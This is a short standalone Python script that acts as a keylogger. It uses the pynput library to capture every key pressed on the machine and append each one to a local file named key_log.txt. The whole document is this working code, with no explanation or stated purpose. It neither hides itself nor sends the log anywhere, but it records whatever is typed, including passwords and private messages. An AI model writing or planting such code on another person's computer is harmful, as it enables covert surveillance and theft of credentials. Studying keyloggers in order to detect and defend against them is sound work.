from pynput.keyboard import Listener

def on_press(key):
    key = str(key).replace("'", "")
    with open("key_log.txt", "a") as file:
        file.write(key + "\n")

with Listener(on_press=on_press) as listener:
    listener.join()
